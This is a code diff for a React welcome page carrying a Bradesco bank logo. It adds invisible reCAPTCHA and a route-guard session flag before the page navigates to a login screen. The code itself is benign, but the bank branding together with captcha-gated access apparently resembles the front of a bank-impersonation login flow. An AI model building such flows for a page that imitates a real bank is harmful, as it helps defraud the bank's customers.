@@ -1,9 +1,31 @@
 import { useNavigate } from "react-router-dom";
+import { useCallback } from "react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { markSessionStarted } from "@/hooks/useRouteGuard";
 
+declare global {
+  interface Window {
+    grecaptcha: any;
+    onRecaptchaSuccess: (token: string) => void;
+  }
+}
+
+const RECAPTCHA_SITE_KEY = "6LcI5JQsAAAAAMsI-_QhAk89MSuKiPRLKK_KNJJK";
+
 const WelcomePage = () => {
   const navigate = useNavigate();
+
+  const onRecaptchaSuccess = useCallback(() => {
+    markSessionStarted();
+    navigate("/login");
+  }, [navigate]);
+
+  const handleClick = () => {
+    window.onRecaptchaSuccess = onRecaptchaSuccess;
+    if (window.grecaptcha) {
+      window.grecaptcha.execute();
+    }
+  };
 
   return (
     <>
@@ -41,8 +63,14 @@ const WelcomePage = () => {
 
           {/* Bottom button */}
           <div className="w-full pb-12 space-y-4">
+            <div
+              className="g-recaptcha"
+              data-sitekey={RECAPTCHA_SITE_KEY}
+              data-callback="onRecaptchaSuccess"
+              data-size="invisible"
+            />
             <button
-              onClick={() => { markSessionStarted(); navigate("/login"); }}
+              onClick={handleClick}
               className="w-full h-14 rounded-full bg-white text-[hsl(220,70%,45%)] text-base font-bold tracking-wide active:scale-[0.97] transition-all duration-200 shadow-lg"
             >
               Iniciar login
